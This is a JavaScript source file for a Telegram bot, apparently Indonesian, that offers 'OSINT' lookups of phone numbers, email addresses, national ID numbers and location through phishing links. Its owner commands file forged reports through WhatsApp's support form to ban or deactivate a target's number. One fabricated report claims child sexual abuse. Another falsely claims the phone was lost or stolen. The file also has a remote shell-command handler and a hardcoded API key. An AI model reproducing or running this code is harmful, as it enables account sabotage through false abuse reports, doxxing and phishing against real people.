    case "/start":
      const currentTime = moment().format("YYYY-MM-DD HH:mm:ss");
      const name = msg.from.first_name || "";
      const username = msg.from.username || "";
      if (!isUserExists(msg.chat.id)) {
        addUser(msg.chat.id);
      }

      let fitur_en = `PHONE NUMBER FEATURES
/phone - Check cell phone number information from the internet
/wachat - WhatsApp Account Search
/waapi - WhatsApp Message Search
/number - Check social media from your cellphone number
/wallet - Check your e-wallet phone number
/msisdn - Check the CNAME number
/scanwa - Scan groups from whatsapp numbers
/searchno - Manual Number Search
/nohp - Phoneinfoga
/parseno - Check Information & Parse HP Numbers
/cekno - Check HP Number Information

EMAIL FEATURES
/gid - Search By Google ID
/ghunt - Check Gmail Information
/mail - Searches for email on the internet
/email - Check email information

SEARCH FEATURES
/wacall - Search WhatsApp Calls
/grupwa - Search WhatsApp groups
/chat - Search Telegram Chats
/archive - Archive Domain Search
/exe - Exe File Search
/github - Github Content Search
/tele - Search Telegram
/telepriv - Search Telegram Private
/blogspot - Blogger profile search
/sosmed - Social Media Search
/dir - Search Website Dir
/anonfile - Search Anonfile.com
/apk - APK Document Search
/drive - Google Drive search
/doc - Search WORD Documents
/excel - Excel search
/ppt - PowerPoint search
/pdf - PDF Document Search
/ftp - FTP Public Search
/gslide - Google Slides Search
/gdoc - Google Docs Search
/form - Google Forms search
/secretdoc - Search for Secret Documents
/gexcel - Google Sheets search
/gphoto - Google Photos Public Search
/telegram - Lookup telegram account data


TRACKING FEATURES
/track - Creates a phishing tracking link
/result - View the results of location phishing
/bts - Tracks the location of BTS Towers
/bssid - Track WIFI Location

ID FEATURES
/userid - Checks the status of the bot's user id
/lookup - Checks the Intellius user ID
/id - Check your ID

WEB INTERNET FEATURES
/whois - Check domain information
/ip - Checks IP Address information
/portscan - Check web ports
/domage - Checks the age of the web
/mac - Check MAC Address 

FEATURES OF FRAUD
/bank - Check Bank fraud reports
/penipu - Checks impostor
/lapor - Report fraudsters
/report - Report fraudsters

ACCOUNT FEATURES
/blogger - Search for blogger web profiles
/github - Check the github profile

PARSING FEATURES
/nik - Parses the NIK number

/help - Help
/lang - Change Language

OWNER FEATURES
/logout - Logout the WhatsApp Number
/banned - Bans WhatsApp Numbers
/resetotp - Reset WhatsApp OTP
/ban - Ban Bot Users
/unban - Bot User Unban`;

      let fitur_russian = `НОМЕР ТЕЛЕФОНА ФУНКЦИЯ
/phone - Проверить информацию о номере мобильного телефона из Интернета
/wachat - Поиск учетной записи WhatsApp
/waapi - Поиск сообщений WhatsApp
/number - Проверьте социальные сети с вашего номера мобильного телефона
/wallet - Проверить номер телефона электронного кошелька
/msisdn — проверить номер CNAME
/scanwa - Сканировать группы по номерам WhatsApp
/searchno - Ручной поиск по номеру
/nohp - Phoneinfoga
/parseno - Проверить информацию и разобрать номера HP
/cekno - Проверить информацию о номере HP

ФУНКЦИИ ЭЛЕКТРОННОЙ ПОЧТЫ
/gid - Поиск по идентификатору Google
/ghunt - Проверить информацию Gmail
/mail - Поиск электронной почты в Интернете
/email - проверить информацию электронной почты

ОСОБЕННОСТИ ПОИСКА
/wacall - Поиск звонков в WhatsApp
/grupwa - Поиск групп WhatsApp
/chat - Поиск в чатах Telegram
/archive - Поиск домена в архиве
/exe - Поиск исполняемых файлов
/github — Поиск содержимого Github
/теле - Поиск в телеграмме
/telepriv - Поиск Telegram Private
/blogspot – поиск по профилю Blogger.
/sosmed - Поиск в социальных сетях
/dir - Поиск каталога на сайте
/anonfile - Поиск Anonfile.com
/apk - Поиск документов APK
/drive - поиск на Google Диске
/doc - Поиск документов WORD
/excel - Поиск в Excel
/ppt — поиск в PowerPoint
/pdf - Поиск PDF-документов
/ftp — общедоступный FTP-поиск
/gslide — Поиск Google Презентаций
/gdoc — Поиск документов Google
/form - поиск по формам Google
/secretdoc - Поиск секретных документов
/gexcel - поиск в Google Таблицах
/gphoto — общедоступный поиск Google Фото
/telegram - Поиск данных учетной записи телеграммы


ОСОБЕННОСТИ ОТСЛЕЖИВАНИЯ
/track — Создает ссылку для отслеживания фишинга.
/result - просмотреть результаты фишинга местоположения
/bts — отслеживает местоположение башен BTS.
/bssid - Отслеживание местоположения WIFI

ИДЕНТИФИКАЦИОННЫЕ ФУНКЦИИ
/userid — Проверяет статус идентификатора пользователя бота.
/lookup — проверяет идентификатор пользователя Intellius.
/id - Проверить свой ID

ВОЗМОЖНОСТИ ИНТЕРНЕТА
/whois - Проверить информацию о домене
/ip — проверяет информацию об IP-адресе
/portscan - Проверить веб-порты
/domage - Проверяет возраст сети
/mac - Проверить MAC-адрес

ОСОБЕННОСТИ МОШЕННИЧЕСТВА
/bank - Проверить отчеты о мошенничестве в банке
/penipu - Проверяет самозванца
/lapor - Сообщить о мошенниках
/report - Сообщить о мошенниках

ОСОБЕННОСТИ УЧЕТНОЙ ЗАПИСИ
/blogger — поиск веб-профилей блоггеров.
/github — Проверить профиль на github.

ОСОБЕННОСТИ РАЗБОРКИ
/nik - Анализирует номер NIK

/Помогите помогите
/lang - Изменить язык

ОСОБЕННОСТИ ВЛАДЕЛЬЦА
/logout - выйти из номера WhatsApp
/banned - Запретить номера WhatsApp
/resetotp - Сбросить одноразовый пароль WhatsApp
/ban - Банить пользователей-ботов
/unban - Разблокировать пользователя-бота`;

      let fitur_id = `FITUR NOMOR HP
/phone - Cek Informasi Nomor Hp Dari Internet
/wachat - Pencarian Akun WhatsApp
/waapi - Pencarian Pesan WhatsApp
/nomor - Cek sosmed dari no hp
/wallet - Cek E-Wallet nomor hp
/msisdn - Cek CNAME Nomor
/scanwa - Scan group dari nomor whatsapp
/searchno - Manual Pencarian Nomor
/nohp - Phoneinfoga
/parseno - Cek Informasi & Parsing Nomor HP
/cekno - Cek Informasi Nomor HP

FITUR EMAIL
/gid - Pencarian Berdasarkan Google ID
/ghunt - Cek Informasi Gmail
/mail - Pencarian email di internet
/email - Cek informasi email

FITUR SEAERCH
/wacall - Pencarian WhatsApp Call
/grupwa - Pencarian Group WhatsApp
/chat - Pencarian Chat Telegram
/archive - Pencarian Archive Domain
/exe - Pencarian File Exe
/github - Pencarian Konten Github
/tele - Pencarian Telegram
/telepriv - Pencarian Telegram Private
/blogspot - Pencarian Profile Blogger
/sosmed - Pencarian Sosial Media
/dir - Pencarian Dir Website
/anonfile - Pencarian Anonfile.com
/apk - Pencarian Dokumen APK
/drive - Pencarian Google Drive
/doc - Pencarian Dokumen WORD
/excel - Pencarian Excel
/ppt - Pencarian Power Point
/pdf - Pencarian Dokumen PDF
/ftp - Pencarian Publik FTP
/gslide - Pencarian Google Slide
/gdoc - Pencarian Google Dokumen
/form - Pencarian Google Form
/secretdoc - Pencarian Dokumen Rahasia
/gexcel - Pencarian Google Spreadseets
/gphoto - Pencarian Publik Google Foto
/telegram - Pencarian data akun telegram


FITUR TRACKING
/track - Membuat phising link pelacakan
/result - Melihat hasil phising lokasi
/bts - Melacak lokasi Tower BTS
/bssid - Lacak Lokasi WIFI

FITUR ID
/userid - Cek status id user bot
/lookup - Cek ID user intellius
/id - Cek ID Anda

FITUR INTERNET WEB
/whois - Cek informasi domain
/ip - Cek informasi Ip Address
/portscan - Cek Port web
/domage - Cek umur web
/mac - Cek MAC Address

FITUR PENIPUAN
/bank - Cek Laporan penipuan bank
/penipu - Cek penipu
/lapor - Lapor penipu
/report - Lapor penipu

FITUR AKUN
/blogger - Mencari profile web blogger
/github - Cek profile github

FITUR PARSING
/nik - Parsing nomor NIK

/help - Bantuan
/lang - Ganti Bahasa

FITUR OWNER
/logout - Logout Nomor WhatsApp
/banned - Ban Nomor WhatsApp
/resetotp - Reset OTP WhatsApp
/ban - Ban Pengguna Bot
/unban - Unban Pengguna Bot
`;

      const apikey_data = await getExpiryDate(chatId);

      console.log(apikey_data);

      let welcomeMessage = `<b>Halo, ${name}!</b> Selamat datang di bot ini.`;

      if (isPremium) {
        welcomeMessage += "\n\nAnda adalah pengguna premium.";
      } else {
        welcomeMessage += "\n\nAnda bukan pengguna premium.";
      }

      welcomeMessage += `
            \nInformasi Pengguna:
    - Nama: ${name}
    - Username: ${username}
    - ID: ${msg.from.id}

    Expiry Date: ${apikey_data.expdate}\nDays Left: ${apikey_data.daysLeft} days

    Informasi Server:
    - Waktu saat ini: ${currentTime}

Server1 : @osintidbot
Server2 : @intelliusbot
Server3 : @intellius3bot

    FORMAT INPUT:
    /COMMAND [VALUE]

    Jangan input value pada command jika ingin mengetahui format pengiriman

    CEK STATUS BOT
    /status`;

      if (languageConfig[chatId] === "english") {
        const translatedText = await translateToEnglish(welcomeMessage);

        let result_welcome = `${translatedText}\n\n${fitur_en}\n\n<a href="https://osinteak.digital/">CLICK FOR 
    -[ OSINT WEB VERSION ]-</a>`;

        bot.sendMessage(chatId, result_welcome, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Language 🇺🇸 / Bahasa 🇮🇩 / Язык 🇷🇺",
                  callback_data: "lang",
                },
              ],
            ],
          },
        });
      } else if (languageConfig[chatId] === "russian") {
        const translatedText = await translateToRussian(welcomeMessage);

        let result_welcome = `${translatedText}\n\n${fitur_russian}\n\n<a href="https://osinteak.digital/">CLICK FOR 
    -[ OSINT WEB VERSION ]-</a>`;

        bot.sendMessage(chatId, result_welcome, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Language 🇺🇸 / Bahasa 🇮🇩 / Язык 🇷🇺",
                  callback_data: "lang",
                },
              ],
            ],
          },
        });
      } else {
        let result_welcome = `${welcomeMessage}\n\n${fitur_id}\n\n<a href="https://osinteak.digital/">KLIK UNTUK 
    -[ OSINT VERSI WEB ]-</a>`;

        bot.sendMessage(chatId, result_welcome, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Language 🇺🇸 / Bahasa 🇮🇩 / Язык 🇷🇺",
                  callback_data: "lang",
                },
              ],
            ],
          },
        });
      }
      break;
    case "/help":
      sendMessage(
        chatId,
        "Jika ada pertanyaan atau bantuan, anda bisa berlangganan channel",
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Channel Update",
                  url: "https://t.me/RasiTechChannel1",
                },
              ],
            ],
          },
        }
      );
      break;
    case "/id":
      sendMessage(chatId, "123 ID Anda : `" + msg.from.id + "`", {
        parse_mode: "markdownv2",
      });
      break;
    case "/ban":
      if (isBotOwner(msg.from.id)) {
        // Pengecekan argumen perintah, pastikan ada argumen
        if (msg.text.split(" ").length > 1) {
          const userIdToBan = msg.text.split(" ")[1];

          // Baca data banned dari database
          const bannedUsers = readBannedUsers();

          // Periksa apakah pengguna sudah dibanned sebelumnya
          if (!bannedUsers.includes(userIdToBan)) {
            // Jika belum, tambahkan pengguna ke daftar banned
            bannedUsers.push(userIdToBan);
            writeBannedUsers(bannedUsers);
            sendMessage(
              chatId,
              `Pengguna dengan ID ${userIdToBan} telah dibanned.`
            );
          } else {
            sendMessage(
              chatId,
              `Pengguna dengan ID ${userIdToBan} sudah dibanned sebelumnya.`
            );
          }
        } else {
          sendMessage(chatId, "Format perintah salah. Gunakan: /ban <user_id>");
        }
      } else {
        sendMessage(
          chatId,
          "Anda tidak memiliki izin untuk menggunakan perintah ini."
        );
      }
      break;
    case "/unban":
      if (isBotOwner(msg.from.id)) {
        // Pengecekan argumen perintah, pastikan ada argumen
        if (msg.text.split(" ").length > 1) {
          const userIdToUnban = msg.text.split(" ")[1];

          // Baca data banned dari database
          const bannedUsers = readBannedUsers();

          // Periksa apakah pengguna ada di dalam daftar banned
          if (bannedUsers.includes(userIdToUnban)) {
            // Jika ada, hapus pengguna dari daftar banned
            const updatedBannedUsers = bannedUsers.filter(
              (userId) => userId !== userIdToUnban
            );
            writeBannedUsers(updatedBannedUsers);
            sendMessage(
              chatId,
              `Pengguna dengan ID ${userIdToUnban} telah di-unban.`
            );
          } else {
            sendMessage(
              chatId,
              `Pengguna dengan ID ${userIdToUnban} tidak ditemukan dalam daftar banned.`
            );
          }
        } else {
          sendMessage(
            chatId,
            "Format perintah salah. Gunakan: /unban <user_id>"
          );
        }
      } else {
        sendMessage(
          chatId,
          "Anda tidak memiliki izin untuk menggunakan perintah ini."
        );
      }
      break;
    case "/banned":
      if (isBotOwner(msg.from.id)) {
        const phoneNumber = query.trim();

        if (!phoneNumber.startsWith("+")) {
          bot.sendMessage(
            chatId,
            'Invalid phone number format. Please enter the phone number starting with "+".'
          );
          logActivity(userId, msg.from.username, bannedCommand);
          return;
        }

        const bannedWhatsApp = async () => {
          // Menambahkan pesan loading
          const loadingMessage = await bot.sendMessage(
            chatId,
            "Banning number... Please wait."
          );

          const finding = await (
            await require("awesome-phonenumber")(phoneNumber)
          ).g;
          const ntah = await axios.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          const email = await axios.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          const cookie = ntah.headers["set-cookie"].join("; ");
          const $ = cheerio.load(ntah.data);
          const $form = $("form");
          const url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          const form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", finding.regionCode);
          form.append("phone_number", finding.number.international);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "I am a 9 year old woman I am still a student in elementary school!\nThere is someone unknown forcing me to have sex with me, and he has my photo to serve as a curse lineage."
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");

          try {
            const res = await axios({
              url,
              method: "POST",
              data: form,
              headers: { cookie },
            });
            if (res.data.includes("true")) {
              let successMessage = `Number Banned: ${phoneNumber}\n\nResults: Data ${util
                .format(JSON.parse(res.data.replace("for (;;);", "")))
                .replace(
                  "I am a 9 year old woman I am still a student in elementary school!\nThere is someone unknown forcing me to have sex with me, and he has my photo to serve as a curse lineage.",
                  "CENSORED"
                )
                .replace(email.data[0], "CENSORED")
                .replace(email.data[0], "CENSORED")}`;

              if (successMessage.length > 4096) {
                successMessage = successMessage.substring(0, 4093) + "...";
              }

              // Mengedit pesan loading dengan hasil
              bot.editMessageText(successMessage, {
                chat_id: chatId,
                message_id: loadingMessage.message_id,
              });
            } else {
              // Mengedit pesan loading dengan pesan error
              bot.editMessageText("Limit! try again later.", {
                chat_id: chatId,
                message_id: loadingMessage.message_id,
              });
            }
          } catch (error) {
            console.log(error);
            // Mengedit pesan loading dengan pesan error
            bot.editMessageText("An error occurred.", {
              chat_id: chatId,
              message_id: loadingMessage.message_id,
            });
          }
        };
        bannedWhatsApp(); // Panggil fungsi bannedWhatsApp() setelah nomor telepon yang valid dimasukkan oleh pengguna
      } else {
        sendMessage(
          chatId,
          "Anda tidak memiliki izin untuk menggunakan perintah ini."
        );
      }
      break;
    case "/logout":
      if (isBotOwner(msg.from.id)) {
        const phoneNumber = query.trim();

        if (!phoneNumber.startsWith("+")) {
          bot.sendMessage(
            chatId,
            'Invalid phone number format. Please enter the phone number starting with "+".'
          );
          logActivity(userId, msg.from.username, logoutCommand);
          return;
        }

        const outwa = async () => {
          // Menambahkan pesan loading
          const loadingMessage = await bot.sendMessage(
            chatId,
            "Logging out... Please wait."
          );

          const finding = await (
            await require("awesome-phonenumber")(phoneNumber)
          ).g;
          const ntah = await axios.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          const email = await axios.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          const cookie = ntah.headers["set-cookie"].join("; ");
          const $ = cheerio.load(ntah.data);
          const $form = $("form");
          const url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          const form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", finding.regionCode);
          form.append("phone_number", finding.number.international);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append("your_message", "Perdido/roubado: desative minha conta");
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");

          try {
            const res = await axios({
              url,
              method: "POST",
              data: form,
              headers: { cookie },
            });
            if (res.data.includes("true")) {
              let successMessage = `Success Logout: ${phoneNumber}\n\nResults: Data ${util
                .format(JSON.parse(res.data.replace("for (;;);", "")))
                .replace("Perdido/roubado: desative minha conta", "CENSORED")
                .replace(email.data[0], "CENSORED")
                .replace(email.data[0], "CENSORED")}`;

              if (successMessage.length > 4096) {
                successMessage = successMessage.substring(0, 4093) + "...";
              }

              // Mengedit pesan loading dengan hasil
              bot.editMessageText(successMessage, {
                chat_id: chatId,
                message_id: loadingMessage.message_id,
              });
            } else {
              // Mengedit pesan loading dengan pesan error
              bot.editMessageText("Limit! try again later.", {
                chat_id: chatId,
                message_id: loadingMessage.message_id,
              });
            }
          } catch (error) {
            console.log(error);
            // Mengedit pesan loading dengan pesan error
            bot.editMessageText("An error occurred.", {
              chat_id: chatId,
              message_id: loadingMessage.message_id,
            });
          }
        };
        outwa(); // Panggil fungsi outwa() setelah nomor telepon yang valid dimasukkan oleh pengguna
      } else {
        sendMessage(
          chatId,
          "Anda tidak memiliki izin untuk menggunakan perintah ini."
        );
      }
      break;
    case "/resetotp":
      if (isBotOwner(msg.from.id)) {
        const phoneNumber = query.trim();

        if (!phoneNumber.startsWith("+")) {
          bot.sendMessage(
            chatId,
            'Invalid phone number format. Please enter the phone number starting with "+".'
          );
          logActivity(userId, msg.from.username, resetOtpCommand);
          return;
        }

        const resetOtp = async () => {
          // Menambahkan pesan loading
          const loadingMessage = await bot.sendMessage(
            chatId,
            "Resetting OTP... Please wait."
          );

          const finding = await (
            await require("awesome-phonenumber")(phoneNumber)
          ).g;
          const ntah = await axios.get(
            "https://www.whatsapp.com/contact/noclient/"
          );
          const email = await axios.get(
            "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
          );
          const cookie = ntah.headers["set-cookie"].join("; ");
          const $ = cheerio.load(ntah.data);
          const $form = $("form");
          const url = new URL($form.attr("action"), "https://www.whatsapp.com")
            .href;
          const form = new URLSearchParams();
          form.append("jazoest", $form.find("input[name=jazoest]").val());
          form.append("lsd", $form.find("input[name=lsd]").val());
          form.append("step", "submit");
          form.append("country_selector", finding.regionCode);
          form.append("phone_number", finding.number.international);
          form.append("email", email.data[0]);
          form.append("email_confirm", email.data[0]);
          form.append("platform", "ANDROID");
          form.append(
            "your_message",
            "Yth : Whatsaap\nMohon Bantuannya,Beberapa hari Ini whatsapp Saya di salah gunakan Oleh Orang lain Yang tidak bertanggung jawab dan tanpa sepengetahuan saya menginstal aplikasi whatsapp Modifikasi,sehingga nomor whatsapp saya terblokir.\n\nSaya harap Bisa di pulihkan Kembali seperti sebelumnya.\nTerimakasih"
          );
          form.append("__user", "0");
          form.append("__a", "1");
          form.append("__csr", "");
          form.append("__req", "8");
          form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
          form.append("dpr", "1");
          form.append("__ccg", "UNKNOWN");
          form.append("__rev", "1006630858");
          form.append("__comment_req", "0");

          try {
            const res = await axios({
              url,
              method: "POST",
              data: form,
              headers: { cookie },
            });
            if (res.data.includes("true")) {
              let successMessage = `Success Reset OTP: ${phoneNumber}\n\nResults: Data ${util
                .format(JSON.parse(res.data.replace("for (;;);", "")))
                .replace(
                  "Yth : Whatsaap\nMohon Bantuannya,Beberapa hari Ini whatsapp Saya di salah gunakan Oleh Orang lain Yang tidak bertanggung jawab dan tanpa sepengetahuan saya menginstal aplikasi whatsapp Modifikasi,sehingga nomor whatsapp saya terblokir.\n\nSaya harap Bisa di pulihkan Kembali seperti sebelumnya.\nTerimakasih",
                  "CENSORED"
                )
                .replace(email.data[0], "CENSORED")
                .replace(email.data[0], "CENSORED")}`;

              if (successMessage.length > 4096) {
                successMessage = successMessage.substring(0, 4093) + "...";
              }

              // Mengedit pesan loading dengan hasil
              bot.editMessageText(successMessage, {
                chat_id: chatId,
                message_id: loadingMessage.message_id,
              });
            } else {
              // Mengedit pesan loading dengan pesan error
              bot.editMessageText("Limit! try again later.", {
                chat_id: chatId,
                message_id: loadingMessage.message_id,
              });
            }
          } catch (error) {
            console.log(error);
            // Mengedit pesan loading dengan pesan error
            bot.editMessageText("An error occurred.", {
              chat_id: chatId,
              message_id: loadingMessage.message_id,
            });
          }
        };

        resetOtp(); // Panggil fungsi resetOtp() setelah nomor telepon yang valid dimasukkan oleh pengguna
      } else {
        sendMessage(
          chatId,
          "Anda tidak memiliki izin untuk menggunakan perintah ini."
        );
      }
      break;
    case "/exec":
      if (isBotOwner(msg.from.id)) {
        const commandToExecute = args.join(" ");
        executeCommand(commandToExecute, chatId);
      } else {
        sendMessage(
          chatId,
          "Anda tidak memiliki izin untuk menggunakan perintah ini."
        );
      }
      break;

      if (!query)
        return sendMessage(
          chatId,
          "Masukan kata kunci pencarian!\n\n/sfile youtube"
        );
      // Membuat URL API pencarian file dengan query yang diberikan
      const apiUrl = `https://api.zahwazein.xyz/searching/sfilesearch?apikey=zenzkey_bff36c6fa327&query=${query}`;

      // Mengambil data dari API
      axios
        .get(apiUrl)
        .then((response) => {
          const data = response.data;

          // Memeriksa status respons API
          if (data.status === "OK") {
            const results = data.result;

            // Memilih hasil acak dari array hasil
            const randomResult =
              results[Math.floor(Math.random() * results.length)];

            // Memeriksa apakah hasil memiliki ikon, nama, dan tautan
            if (randomResult.icon && randomResult.name && randomResult.link) {
              // Mengirim stiker dan tombol tautan inline
              sendStickerWithInlineButton(
                chatId,
                randomResult.icon,
                randomResult.name,
                randomResult.link
              );
            } else {
              sendMessage(chatId, "Tidak ada hasil yang valid ditemukan.");
            }
          } else {
            sendMessage(chatId, "Terjadi kesalahan dalam mencari file.");
          }
        })
        .catch((error) => {
          console.log("Error:", error);
          sendMessage(chatId, "Terjadi kesalahan dalam mencari file.");
        });
      break;
    case "/bc":
      if (isBotOwner(msg.from.id)) {
        const broadcastMessage = args.join(" ");
        sendBroadcastMessage(broadcastMessage);
      } else {
        sendMessage(
          chatId,
          "Anda tidak memiliki izin untuk menggunakan perintah ini."
        );
      }
      break;
    default:
      sendMessage(
        chatId,
        "Perintah tidak dikenali. Silakan coba cek menu start lagi."
      );
      break;
  }
});
const portsList = {
  21: "FTP",
  22: "SSH",
  23: "Telnet",
  25: "SMTP",
  43: "Whois",
  53: "DNS",
  68: "DHCP",
  80: "HTTP",
  110: "POP3",
  115: "SFTP",
  119: "NNTP",
  123: "NTP",
  139: "NetBIOS",
  143: "IMAP",
  161: "SNMP",
  220: "IMAP3",
  389: "LDAP",
  443: "SSL",
  1521: "Oracle SQL",
  2049: "NFS",
  3306: "mySQL",
  5800: "VNC",
  8080: "HTTP",
};
var prt = "";
const checkPort = async (chatId, port, website) =>
  new Promise((resolve, reject) => {
    portscanner.checkPortStatus(port, website, (error, status) => {
      if (!error) {
        if (status == "open") {
          prt += `${port}\t<b>${status}</b>\t${portsList[port]}\n`;
        } else {
          prt += `${port}\t<s>${status}</s>\t${portsList[port]}\n`;
        }
      }

      resolve();
    });
  });

async function getKTPInfo(nik) {
  try {
    const response = await axios.get(
      `https://tool.zerif.site/app/ktp/ktp_check.php?nik=${nik}`
    );
    return response.data;
  } catch (error) {
    console.error(error);
  }
}

// Fungsi untuk mengirim stiker dan tombol tautan inline
async function sendStickerWithInlineButton(chatId, icon, name, link) {
  try {
    // Mengambil stiker dari URL icon
    const response = await axios.get(icon, { responseType: "arraybuffer" });

    // Konversi ke format stiker yang didukung (WEBP)
    const convertedStickerBuffer = await sharp(response.data)
      .toFormat("webp")
      .toBuffer();

    // Mengirim stiker
    await bot.sendSticker(chatId, convertedStickerBuffer);

    // Mengirim pesan teks dengan tombol tautan inline
    await sendMessage(chatId, `${name}\n\n${link}`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Download",
              url: link,
            },
          ],
        ],
      },
    });
  } catch (error) {
    console.log("Error sending sticker:", error);
  }
}

// Memeriksa apakah pengguna adalah pemilik bot
function isBotOwner(userId) {
  // Ganti dengan ID pengguna Anda sebagai pemilik bot
  const ownerUserId = "1613688326";
  return userId.toString() === ownerUserId;
}

// Memeriksa apakah pengguna adalah pengguna premium
function checkPremium(userId) {
  const premiumData = getPremiumData();
  return premiumData.includes(userId);
}

// Menambahkan pengguna ke daftar premium
function addPremiumUser(userId) {
  const premiumData = getPremiumData();
  premiumData.push(userId);
  savePremiumData(premiumData);
}

// Mendapatkan data premium dari file premium.json
function getPremiumData() {
  const data = fs.readFileSync("premium.json", "utf8");
  return JSON.parse(data);
}

// Menyimpan data premium ke file premium.json
function savePremiumData(data) {
  fs.writeFileSync("premium.json", JSON.stringify(data));
}

// Menjalankan perintah terminal
function executeCommand(command, chatId) {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      sendMessage(chatId, `Terjadi kesalahan:\n${error.message}`);
      return;
    }

    if (stderr) {
      sendMessage(chatId, `Output error:\n${stderr}`);
      return;
    }

    const output = stdout.toString();

    sendMessage(chatId, `Output:\n${output}`);
  });
}
// Menjalankan perintah terminal
function executeMsisdn(command, chatId) {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      sendMessage(chatId, `Terjadi kesalahan:\n${error.message}`);
      return;
    }

    if (stderr) {
      sendMessage(chatId, `Output error:\n${stderr}`);
      return;
    }

    const output = stdout.toString();

    sendMessage(
      chatId,
      `++++++++ [PHONE NUMBER SEARCH] +++++++\n\n${output.replace(
        /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g,
        ""
      )}`
    );
  });
}

// Mengecek apakah ID pengguna sudah ada dalam file user.json
function isUserExists(userId) {
  const users = getUsers();
  return users.includes(userId);
}

// Menambahkan ID pengguna ke dalam file user.json
function addUser(userId) {
  const users = getUsers();
  users.push(userId);
  saveUsers(users);
}

// Mendapatkan daftar ID pengguna dari file user.json
function getUsers() {
  try {
    const data = fs.readFileSync("users.json", "utf8");
    return JSON.parse(data);
  } catch (error) {
    return [];
  }
}

// Menyimpan daftar ID pengguna ke dalam file user.json
function saveUsers(users) {
  fs.writeFileSync("users.json", JSON.stringify(users));
}

// Mengirim pesan broadcast ke seluruh ID pengguna dalam file users.json dengan delay 3 detik
function sendBroadcastMessage(message) {
  const users = getUsers();
  users.forEach((userId, index) => {
    setTimeout(() => {
      sendMessage(userId, message);
    }, index * 3000); // Delay 3 detik (3000 ms) antara pengiriman pesan
  });
}

// Fungsi untuk mengambil 6 hasil secara acak dari array hasil pencarian
function getRandomResults(results, count) {
  const shuffledResults = results.sort(() => 0.5 - Math.random());
  return shuffledResults.slice(0, count);
}

// Fungsi untuk mendapatkan nama lengkap berdasarkan first_name dan last_name
function getFullName(result) {
  let fullName = result.first_name || "";
  if (result.last_name) {
    fullName += " " + result.last_name;
  }
  return fullName.trim();
}


// Recursively format the nested JSON data
function formatPhoneInfo(data) {
  let message = '';
  for (const key in data) {
    const formattedKey = key.charAt(0).toUpperCase() + key.slice(1);
    const value = data[key];
    if (Array.isArray(value)) {
      message += `*${formattedKey}*: \n`;
      value.forEach(item => {
        message += formatPhoneInfo(item) + '\n';
      });
    } else if (typeof value === 'object') {
      message += formatPhoneInfo(value) + '\n';
    } else {
      message += `*${formattedKey}*: ${value}\n`;
    }
  }
  return message;
}
